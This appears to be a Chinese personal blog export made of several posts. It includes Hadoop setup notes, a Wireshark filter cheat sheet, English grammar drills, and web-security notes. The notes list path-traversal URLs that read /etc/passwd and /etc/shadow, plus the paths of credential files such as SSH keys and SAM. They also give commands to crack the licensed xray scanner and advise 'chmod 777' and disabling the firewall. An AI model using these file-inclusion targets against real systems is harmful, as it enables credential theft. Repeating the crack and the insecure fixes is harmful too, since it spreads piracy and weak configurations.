<h5 id="yarn-site-xml"><a href="#yarn-site-xml" class="headerlink" title="yarn-site.xml"></a>yarn-site.xml</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;mapreduce_shuffle&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h5 id="slaves"><a href="#slaves" class="headerlink" title="slaves"></a>slaves</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hadoop</span><br></pre></td></tr></table></figure>

<p>配置完成</p>
<h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p><code>hdfs namenode -format</code>格式化HDFS文件系统</p>
<img src="https://ckcah.github.io/images/homework/hadoop/13.png">

<h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p><code>cd /usr/local/src/hadoop/sbin</code></p>
<p><code>./start-all.sh</code>运行脚本，即可完成</p>
<img src="https://ckcah.github.io/images/homework/hadoop/14.png">

<h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h4><p><code>jps</code>查看是否存在进程</p>
<img src="https://ckcah.github.io/images/homework/hadoop/15.png">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost sbin]<span class="comment"># jps</span></span><br><span class="line">17056 Jps</span><br><span class="line">16657 ResourceManager</span><br><span class="line">16504 SecondaryNameNode  	</span><br><span class="line">16347 DataNode</span><br><span class="line">16220 NameNode</span><br></pre></td></tr></table></figure>



<p>打开浏览器，验证是否成功访问</p>
<img src="https://ckcah.github.io/images/homework/hadoop/28.png">



<img src="https://ckcah.github.io/images/homework/hadoop/29.png">



<h3 id="配置局域网也可访问"><a href="#配置局域网也可访问" class="headerlink" title="配置局域网也可访问"></a>配置局域网也可访问</h3><p><strong>题外话</strong>：虚拟机搭建的话，因为IP地址是自动分配的，所以有时候会出现IP地址变更的情况，所以我建议改成静态IP</p>
<p>如果要配置局域网也可访问，就涉及到linux的防火墙功能.</p>
<p>很简单，只需要关闭防火墙就行.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service &amp;&amp; systemctl <span class="built_in">disable</span> firewalld.service</span><br></pre></td></tr></table></figure>



<h2 id="副本"><a href="#副本" class="headerlink" title="副本"></a>副本</h2><p><strong>此副本不考虑后期安全性，只是初学者尽快解决问题的快捷办法，大佬请绕道</strong></p>
<p><strong>注意</strong>：建议每次更改配置之前，先进入<code>/usr/local/src/hadoop/sbin</code>中，执行<code>stop-all.sh</code>停止hadoop服务，再进行更改，更改完成后，执行<code>start-all.sh</code>开启hadoop服务.</p>
<h4 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h4><p>当我运行hdfs时，出现了这种情况</p>
<img src="https://ckcah.github.io/images/homework/hadoop/16.png">

<p>查看问题可以发现，是hadoop给的权限不够</p>
<p>参考：</p>
<img src="https://ckcah.github.io/images/homework/hadoop/17.png">

<p>解决方案：</p>
<p><code>cd /usr/local/src/hadoop/bin</code></p>
<p><code>chmod 777 *</code></p>
<p>over</p>
<p>修改后参考：</p>
<img src="https://ckcah.github.io/images/homework/hadoop/18.png">

<h4 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h4><p>当我再一次运行<code>hdfs namenode -format</code>时，出现了这个</p>
<img src="https://ckcah.github.io/images/homework/hadoop/19.png">

<p>解决方案：</p>
<p><code>cd /usr/local/src/jdk1.8.0_261/bin/</code></p>
<p><code>chmod 777 *</code></p>
<p>参考：</p>
<img src="https://ckcah.github.io/images/homework/hadoop/20.png">

<p>修改后参考：</p>
<img src="https://ckcah.github.io/images/homework/hadoop/21.png">

<h4 id="踩坑三"><a href="#踩坑三" class="headerlink" title="踩坑三"></a>踩坑三</h4><p>执行<code>start-all.sh</code></p>
<img src="https://ckcah.github.io/images/homework/hadoop/22.png">

<p>老方法，直接<code>chmod 777 *</code></p>
<h4 id="踩坑四"><a href="#踩坑四" class="headerlink" title="踩坑四"></a>踩坑四</h4><p>执行<code>start-all.sh</code></p>
<img src="https://ckcah.github.io/images/homework/hadoop/23.png">

<p>这里说的是它的java环境未设置</p>
<p>问题出在<code>/usr/local/src/hadoop/bin/yarn</code></p>
<img src="https://ckcah.github.io/images/homework/hadoop/24.png">

<p>解决方案：</p>
<p>直接更改为绝对路径</p>
<img src="https://ckcah.github.io/images/homework/hadoop/25.png">

<h4 id="踩坑五"><a href="#踩坑五" class="headerlink" title="踩坑五"></a>踩坑五</h4><p>再执行<code>start-all.sh</code></p>
<img src="https://ckcah.github.io/images/homework/hadoop/26.png">

<p>解决方案：</p>
<p>将$JAVA_HOME、$HADOOP_HOME配置到<code>.bashrc</code>、<code>.bash_profile</code>中</p>
<p>并更新配置<code>source .bashrc</code>、<code>source .bash_profile</code></p>
<h4 id="踩坑六"><a href="#踩坑六" class="headerlink" title="踩坑六"></a>踩坑六</h4><img src="https://ckcah.github.io/images/homework/hadoop/30.png">

<p>解决方案：</p>
<p>1.查看centos的IP地址：<code>ifconfig</code></p>
<p>更改<code>/etc/hostname</code>、<code>/etc/hosts</code>如下</p>
<img src="https://ckcah.github.io/images/homework/hadoop/27.png">





<p>未完，待续</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>homework</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>xray简单介绍</title>
    <url>/2020/10/05/xray%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="0x01-xray下载"><a href="#0x01-xray下载" class="headerlink" title="0x01 xray下载"></a>0x01 xray下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/chaitin/xray/releases</span><br></pre></td></tr></table></figure>

<h1 id="0x02-xray官方文档"><a href="#0x02-xray官方文档" class="headerlink" title="0x02 xray官方文档"></a>0x02 xray官方文档</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.xray.cool/#/tutorial/introduce</span><br></pre></td></tr></table></figure>

<h1 id="0x03-xray-破解软件下载"><a href="#0x03-xray-破解软件下载" class="headerlink" title="0x03 xray 破解软件下载"></a>0x03 xray 破解软件下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Lz1y/xray-crack/releases/tag/v1.0</span><br></pre></td></tr></table></figure>



<h1 id="0x04-破解过程"><a href="#0x04-破解过程" class="headerlink" title="0x04 破解过程"></a>0x04 破解过程</h1><h2 id="创建文件夹方便查找文件"><a href="#创建文件夹方便查找文件" class="headerlink" title="创建文件夹方便查找文件"></a>创建文件夹方便查找文件</h2><p>初始状态下应该是只有这三个文件，<code>config.yaml</code>是点击<code>xray_windows_386.exe</code>后生成的</p>
<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005021846719.png"></p>
<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><h3 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h3><p>使用 <code>-g username</code> 生成永久证书</p>
<h3 id="Patch-Xray"><a href="#Patch-Xray" class="headerlink" title="Patch Xray"></a>Patch Xray</h3><p>使用 <code>-c xray_path</code> 修改xray</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;xray-crack.exe -c xray_windows_386.exe</span><br><span class="line">&gt;xray-crack.exe -g ckcahgithubio</span><br></pre></td></tr></table></figure>

<p>完成</p>
<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201005022249364.png" alt="image-20201005022249364"></p>
<h1 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>tools</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>数据分析之Wireshark</title>
    <url>/2020/10/02/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B9%8BWireshark/</url>
    <content><![CDATA[<h3 id="0x01-Wireshark使用"><a href="#0x01-Wireshark使用" class="headerlink" title="0x01 Wireshark使用"></a>0x01 Wireshark使用</h3><p>首先从官网根据自己的环境下载对应的软件版本，然后安装即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.wireshark.org/</span><br></pre></td></tr></table></figure>



<p>接下来打开Wireshark，可以看到设别的网卡信息，选择需要抓包的网卡双击即可。</p>
<p>或者按Ctrl+K，勾选需要抓包的网卡，一般情况都会选择WLAN点击Start开始抓包。从流量波形图可以看到弯曲起伏则表示有流量，直线则没有流量。</p>
<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190225228.png" alt="image-20201002190225228"></p>
<h3 id="0x02-Wireshark语法"><a href="#0x02-Wireshark语法" class="headerlink" title="0x02 Wireshark语法"></a>0x02 Wireshark语法</h3><p>1.过滤MAC地址</p>
<p>eth.addr == 00:71:cc:9a:28:93//过滤目标或源地址是00:71:cc:9a:28:93的数据包</p>
<p>eth.src == 00:71:cc:9a:28:93//过滤源地址是00:71:cc:9a:28:93的数据包</p>
<p>eth.dst == 00:71:cc:9a:28:93//过滤目标地址是00:71:cc:9a:28:93的数据包</p>
<p> 2.过滤VLAN</p>
<p>vlan.id == 1024    //过滤VLANID为1024的数据包</p>
<p>vlan.id_name ==yunzui //过滤VLAN名为1024的数据包</p>
<p> 3.IP过滤</p>
<p>//源地址过滤</p>
<p>ip.src == 8.8.8.8</p>
<p>ip.src eq 8.8.8.8</p>
<p>//目标地址过滤</p>
<p>ip.dst == 8.8.8.8</p>
<p>ip.dst eq 8.8.8.8</p>
<p>//ip地址过滤。不论源还是目标</p>
<p>ip.addr == 8.8.8.8</p>
<p>ip.addr eq 8.8.8.8</p>
<p> 4.端口过滤</p>
<p>tcp.port == 8888</p>
<p>udp.port eq 8888</p>
<p>tcp.dstport == 8888// 只显tcp协议的目标端口8888</p>
<p>tcp.srcport == 8888// 只显tcp协议的来源端口8888</p>
<p>//过滤端口范围</p>
<p>tcp.port &gt;= 1 andtcp.port &lt;= 8888</p>
<p> 5.常用协议过滤</p>
<p>tcp      //只显示TCP协议的数据流</p>
<p>udp      //只显示UDP协议的数据流</p>
<p>arp      //只显示ARP协议的数据流</p>
<p>icmp     //只显示ICMP协议的数据流</p>
<p>http     //只显示HTTP协议的数据流</p>
<p>smtp     //只显示SMTP协议的数据流</p>
<p>ftp      //只显示FTP协议的数据流</p>
<p>dns      //只显示DNS协议的数据流</p>
<p>……</p>
<p>排除HTTP包，如!http 或 not http</p>
<p> 6.HTTP模式过滤</p>
<p>http.request.method== “GET”</p>
<p>http.request.method== “POST”</p>
<p>http.request.uri ==“/img/logo-edu.gif”</p>
<p>http contains “GET”</p>
<p>http contains“HTTP/1.”</p>
<p>// GET数据包</p>
<p>http.request.method== “GET” &amp;&amp; http contains “Host: ”</p>
<p>http.request.method== “GET” &amp;&amp; http contains “User-Agent: ”</p>
<p>// POST数据包</p>
<p>http.request.method== “POST” &amp;&amp; http contains “Host: ”</p>
<p>http.request.method== “POST” &amp;&amp; http contains “User-Agent: ”</p>
<p>// HTTP请求数据包</p>
<p>http.request.method== “POST” &amp;&amp; http contains “Java/1.8.0_121”</p>
<p>// HTTP响应数据包</p>
<p>http contains“HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: ”</p>
<p> 7.运算符</p>
<p>less than：lt</p>
<p>less and equal：le</p>
<p>equal：eq</p>
<p>great then：gt</p>
<p>great and equal：ge</p>
<p>not equal：ne</p>
<p> 8.连接符</p>
<p>and，or</p>
<p>如tcp.port == 8888 andip.addr = 88.88.88.88</p>
<h3 id="0x03-Wireshark功能"><a href="#0x03-Wireshark功能" class="headerlink" title="0x03 Wireshark功能"></a>0x03 Wireshark功能</h3><p>  1.数据包的结构</p>
<p>第1行：数据包整体概述，内容比较多</p>
<p>第2行：数据链路层详细信息，主要为mac地址</p>
<p>第3行：网络层详细信息，主要的是双方的IP地址</p>
<p>第4行：传输层的详细信息，主要的是双方的端口号</p>
<p>第5行：TCP或UDP是传输的DATA，DNS这是域名的相关信息</p>
<p><img src="/.io//Users\C\AppData\Roaming\Typora\typora-user-images\image-20201002190520816.png" alt="image-20201002190520816"></p>
<p>2.wireshark着色规则</p>
<p>在菜单栏中点开视图中的着色规则就可以看到</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title>动名词练习</title>
    <url>/2020/09/11/%E5%8A%A8%E5%90%8D%E8%AF%8D%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h2><p><strong>请练习以下句子，试试看该用(A)不定词to V，还是(B)动名词 Ving。如果两者都可以，答案就是(C)。</strong></p>
<p>1.The barber’s apprentice practiced <strong>to shaving</strong> (shave) on a watermelon.</p>
<p><font color="red">shaving</font></p>
<p>2.I love <strong>to watch</strong> (watch) horror movies alone.</p>
<p><font color="red">to watch 和 watching都可以若用watching，表示“看电影”这件持续进行的事情。若用to watch，则带有一丝想要“去看”的味道。</font></p>
<p>3.<strong>Listening</strong> (Listen) to music can be very relaxing.</p>
<p><font color="red">“听音乐”和dancing、mountain-climbing等要持续的活动一样，多用动名词表示。</font></p>
<p>4.You must not forget <strong>paying</strong> (pay) the phone bill.</p>
<p><font color="red">to pay</font></p>
<p><font color="red">动词must not forget暗示电话费“尚未付，应该去付”，故用表示不确定的to pay</font></p>
<p>5.The workers finished <strong>to paint</strong> (paint) and left.</p>
<p><font color="red">painting</font></p>
<p><font color="red">动词finish表示油漆的工作已经结束，不适合用不确定意味的不定词，故用<br>painting。</font></p>
<p>6.Seeing is <strong>believing</strong> (believe).</p>
<p>7.To see is <strong>to believe</strong> (believe).</p>
<p>8.Thank you for <strong>calling</strong> (call).</p>
<p><font color="red">在介词后面不能用不定词，只能用calling</font></p>
<p>9.John’s__to leave__ (leave) the party so early was rather impolite.</p>
<p><font color="red">leaving</font></p>
<p><font color="red">在所有格后面也不能用不定词，只能用leaving</font></p>
<p>10.I really enjoyed <strong>being</strong> (be) at your party.</p>
<p><font color="red">动词enjoy表示“乐在其中”，如果用不定词to be，意味著“不确定”，也<br>就是“还乐不起来”，所以只能用being，表示“已经在进行中”，因而有乐趣出来。</font></p>
<h2 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h2><p>请选出最适当的答案填入空格内，以使句子完整。</p>
<p>1.I just took __ and don’t feel like swimming now.</p>
<p>D</p>
<p><font color="red">C</font></p>
<p><font color="red">take a swim是“游一趟”，swimming则是“游泳运动”。</font></p>
<blockquote>
<p>(A) swimming</p>
<p>(B) to swim</p>
<p>(C) a swim</p>
<p>(D) swim</p>
</blockquote>
<p>2.I resent __ a hypocrite(<font color="red">伪君子</font>), especially when I’m telling the truth.</p>
<p>D</p>
<p><font color="red">下文“特别是我明明说了实话”，因而前面应该是被动的，“我讨厌被叫作<br>伪君子”。只有D是被动态</font></p>
<blockquote>
<p>(A) calling</p>
<p>(B) called</p>
<p>(C) being calling</p>
<p>(D) being called</p>
</blockquote>
<p>3.__ outside my window every night is getting on my nerves.</p>
<p>A</p>
<p><font color="red">D</font></p>
<p><font color="red">本句的动词is是单数，而A、B、C都以cats为主语，是复数，只有D用<br>screaming(尖叫)作主语，是单数</font></p>
<blockquote>
<p>(A) The cats screaming</p>
<p>(B) The cats to scream</p>
<p>(C) Screaming cats</p>
<p>(D) The cats’ screaming</p>
</blockquote>
<p>4.Learning a language is __ all about the culture.</p>
<p>B</p>
<p><font color="red">空格在be动词后面，是主语补语的位置，要求和主语对称，而主语是动名词，<br>因此也选动名词</font></p>
<blockquote>
<p>(A) to learn</p>
<p>(B) learning</p>
<p>(C) learn</p>
<p>(D) learned</p>
</blockquote>
<p>5.__ is a very exacting sport.</p>
<p>A</p>
<p><font color="red">mountain置于形容词位置，不能有复数</font></p>
<blockquote>
<p>(A) Mountain-climbing</p>
<p>(B) Climb mountains</p>
<p>(C) To climb mountains</p>
<p>(D) Mountains-climbing</p>
</blockquote>
<p>6.In doing magic,the trick lies in __ your audience.</p>
<p>D</p>
<p><font color="red">介词后面应用名词，空格后面又有名词 your audience，<br>故只能选diverting,让your audience作它的宾语</font></p>
<blockquote>
<p>(A) divert</p>
<p>(B) diversion</p>
<p>(C) to divert</p>
<p>(D) diverting</p>
</blockquote>
<p>7.The workers objected to __ like slaves.</p>
<p>D</p>
<p><font color="red">object to的这个to解释为“对”某事表示反对，所以是介词，后应接名词，<br>故由B或D来选。再从意思上看应是被动，“被当奴隶看待”，故选D</font></p>
<blockquote>
<p>(A) be treated</p>
<p>(B) treating</p>
<p>(C) treat</p>
<p>(D) being treated</p>
</blockquote>
<p>8.Everyone marveled at __ the French Open.</p>
<p>A</p>
<p><font color="red">让人啧啧称奇的应是“事”，C和D则是指人，故可排除。而“张德培赢得<br>法国公开赛”中的win是动词（因为后面有the French Open作宾语)，所以<br>在所有格Chang’s之后要改成动名词winning，词类才正确</font></p>
<blockquote>
<p>(A) Michael Chang’s winning</p>
<p>(B) Michael Chang’s win</p>
<p>(C) Michael Chang to win</p>
<p>(D) Michael Chang win</p>
</blockquote>
<p>9.If you don’t mind __ so, I think you are in the wrong.</p>
<p>B</p>
<p><font color="red">D</font></p>
<p><font color="red">意思上应是“不介意我这样说的话”，所以要从C和D来选。再从词类上看，<br>应用名词类的my saying so做mind的宾语，故选D</font></p>
<blockquote>
<p>(A) saying</p>
<p>(B) to say</p>
<p>(C) I say</p>
<p>(D) my saying</p>
</blockquote>
<p>10.He is used to __ lectures—he’s a teacher.</p>
<p>A</p>
<p><font color="red">D</font></p>
<p><font color="red">be used to是“对”某事习惯了，to是介词，故选D作宾语</font></p>
<blockquote>
<p>(A) give</p>
<p>(B) gift</p>
<p>(C) given</p>
<p>(D) giving</p>
</blockquote>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习英语的漫长历程</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>不定式练习</title>
    <url>/2020/09/11/%E4%B8%8D%E5%AE%9A%E5%BC%8F%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>请选出最适当的答案填入空格内，以使句子完整。</strong></p>
<p>1.Not wishing to attend the dance, Marie <strong>A</strong> that she had a fever.<br>(A) made believed<br>(B) make believe<br>(C) makes believe<br>(D) made believe</p>
<p>D</p>
<p>made是使役动词，后边接单词原型，“had”表示事情已经过去</p>
<p>若make believe二字连用时即表示“假装”，已成为常用的短语</p>
<p>2.He is said by his friends  <strong>C</strong>.<br>(A) to be gentle and gracious<br>(B) to have graciousness and gentle<br>(C) gentle and a gracious man<br>(D) that is a gentle and gracious man</p>
<p>A</p>
<p>is said暗示并不明确，所以用不定式</p>
<p>连接词and，其左右要对称</p>
<p>3.<strong>A</strong> any aspect of animal behavior, the biologist must first determine the laws influencing animal behavior.<br>(A) Explain<br>(B) To explain<br>(C) One explains<br>(D) The explanation of</p>
<p>B</p>
<p>B的不定词短语是修饰语的性质，可以附在独立从句上而不影响它的句型</p>
<p>4.”I’ll help you whenever you need me.”<br>“good. I’d like <strong>C</strong> me tomorrow.”<br>(A) you helping<br>(B) that will help<br>(C) you to help<br>(D) that you help</p>
<p>5.“Where did he go?”</p>
<p>“He went to another store <strong>B</strong> .”<br>(A) to buy slacks<br>(B) for buy slacks<br>(C) buy slacks<br>(D) buying slacks</p>
<p>A</p>
<p>in order to buy slacks</p>
<p>“去买裤子”是说明动机或目的</p>
<p>B中以动词buy置于介系词之后，语法错误</p>
<p>6.<strong>C</strong> the silkworm makes a liquid in its body and then squeezes it out through special holes.<br>(A) It makes silk<br>(B) Making silk<br>(C) To make silk,<br>(D) Silk is made by</p>
<p>空格后的部分是个独立从句</p>
<p>in order to make silk</p>
<p>7.I am a peaceful person. Don’t make me <strong>C</strong> violence.<br>(A) use<br>(B) using<br>(C) to use<br>(D) used by</p>
<p>A</p>
<p>make是使役动词</p>
<p>8.Americans <strong>B</strong> bacon and eggs for breakfast every day.<br>(A) used to having<br>(B) are used to have<br>(C) are used to having<br>(D) used to</p>
<p>C</p>
<p>are used 表示“习惯了”，后面的to是介系词，意为“对”某事习惯了。既是介系词，就要有名词作宾语，故选C。如果用used to，可视为助动词看待，表示“从前常常”</p>
<p>9.The bus driver told the man <strong>C</strong> his naughty son to hang out the window.<br>(A) to don’t allow<br>(B) not to allow<br>(C) not allowing<br>(D) don’t allowing</p>
<p>B</p>
<p>told the man 在此是“叫别人去做……”之意，含有要求的味道，也就是 The driver said to the man that he should…之意，因此后面应用不定词</p>
<p>10.To get an education, <strong>B</strong> .<br>(A) one must work hard<br>(B) working hard is necessary<br>(C) there is need to work hard<br>(D) hard work is needed</p>
<p>A</p>
<p>to get an education 是 so that (或 in order that) one can get an education 的意思，所以后面的主要从句应用one作主语</p>
<p>11.The purpose of the investigation is <strong>C</strong> the suspect’s degree of involvement in the crime.<br>(A) to ascertaining<br>(B) ascertaining<br>(C) to ascertain<br>(D) ascertained</p>
<p>主语the purpose是“目的”，而be动词后面的空格是主语补语位置，也就表示目的，所以要用不定词短语to (代表in order to) ascertain (想确定一下）。</p>
<p>12.The witness went on the witness stand ____ by the prosecution.<br>(A) being questioned<br>(B) to question<br>(C) to be questioned<br>(D) questioning</p>
<p>C</p>
<p>by the prosecution (被检方)，表示要用被动态，也就是A和C。而being questioned 意为“正在被质询”，和前面的went on the witness stand (走上证人台）有冲突，应用不定词，表示“走上台后才要”被质询</p>
<p>13.You can playback the answering machine. She <strong>A</strong>.<br>(A) will call<br>(B) could call<br>(C) could have called<br>(D) is calling</p>
<p>C</p>
<p>playback 是“播放”，带子上有声音才能播，所以下文应是“她可能来过电话了”，表示对过去的猜测，要用助动词加完成式</p>
<p>14.<strong>C</strong> able to write an academic paper, you must do a lot of library research.<br>(A) Be<br>(B) Being<br>(C) To be<br>(D) Before</p>
<p>B</p>
<p>从下文的you must。这个条件来看，前面表示的应是一个“目的”，也就是 in order to，所以用不定词。</p>
<p>15.You should avoid <strong>A</strong> vague words in your composition.<br>(A) to use<br>(B) using<br>(C) the use<br>(D) to using</p>
<p>B</p>
<p>avoid 有强烈否定意味，与暗示be going to 的不定词冲突，故用动名词。</p>
<p>16.He is waiting at the restaurant for a free table because he forgot <strong>B</strong> a reservation in advance.<br>(A) making<br>(B) to make<br>(C) made<br>(D) have to make</p>
<p>从上下文看得出来他事先该订位却忘了，所以要用不定词 forgot to make， 意既 He forgot that he should make…</p>
<p>17.We can go out now.It stopped <strong>B</strong> quite a while ago.<br>(A) rain<br>(B) raining<br>(C) to rain<br>(D) rained</p>
<p>C</p>
<p>raining 有持续的暗示，stopped raining表示先前一直在下雨，后来停了。</p>
<p>18.He always has his shoes <strong>C</strong> at the railway station.<br>(A) shone<br>(B) to shine<br>(C) shining<br>(D) shined</p>
<p>D</p>
<p>His shoes are shined…(他的鞋在…给人擦)</p>
<p>把主语shoes改成宾语，补语shined改成宾语补语</p>
<p>19.Don’t sit up too late, for night is a time <strong>B</strong> .<br>(A) resting<br>(B) to rest<br>(C) that rests<br>(D) when rest</p>
<p>to rest是when you should rest 的变化</p>
<p>20.He was made <strong>A</strong> the Bible every night before going to bed.<br>(A) read<br>(B) to read<br>(C) reading<br>(D) reads</p>
<p>B</p>
<p>make虽是使役动词，要用原形动词作补语，可是在被动态中就得把to放回去，成为不定词</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习英语的漫长历程</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>web总结(持续更新)</title>
    <url>/2020/09/10/web%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h3 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt</span><br><span class="line"></span><br><span class="line">www.test.com/test.php?test=../../../../../etc/passwod</span><br><span class="line"></span><br><span class="line">www.test.com/test.php?test=/etc/shado</span><br><span class="line"></span><br><span class="line">wwww.test.com/test.php?test=/etc/php5/apache2/php.ini</span><br><span class="line"></span><br><span class="line">www.test.com/test.php?test=/etc/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">www.test.com/test.php?test=/etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="windows敏感文件"><a href="#windows敏感文件" class="headerlink" title="windows敏感文件"></a>windows敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\\boot.ini</span><br><span class="line"></span><br><span class="line">查看系统版本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\windows\\system32\\inetsrv\\metabase.xml</span><br><span class="line"></span><br><span class="line">查看iis配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\windows\\repair\\sam</span><br><span class="line"></span><br><span class="line">存储系统初次安装的密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\program files\\mysql\\my.ini</span><br><span class="line"></span><br><span class="line">mysql配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\program files\\mysql\\data\\mysql\\user.myd</span><br><span class="line"></span><br><span class="line">mysql root密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\windows\\php.ini</span><br><span class="line"></span><br><span class="line">php配置信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\\windows\\my.ini</span><br><span class="line"></span><br><span class="line">mysql配置信息</span><br></pre></td></tr></table></figure>

<h4 id="linux敏感文件"><a href="#linux敏感文件" class="headerlink" title="linux敏感文件"></a>linux敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line"></span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line"></span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line">/etc/shadow</span><br><span class="line"></span><br><span class="line">/etc/my.cnf</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">/root/.bash_history</span><br><span class="line"></span><br><span class="line">/root/.mysql_history</span><br><span class="line"></span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line"></span><br><span class="line">/proc/mounts</span><br><span class="line"></span><br><span class="line">/porc/config.gz</span><br></pre></td></tr></table></figure>

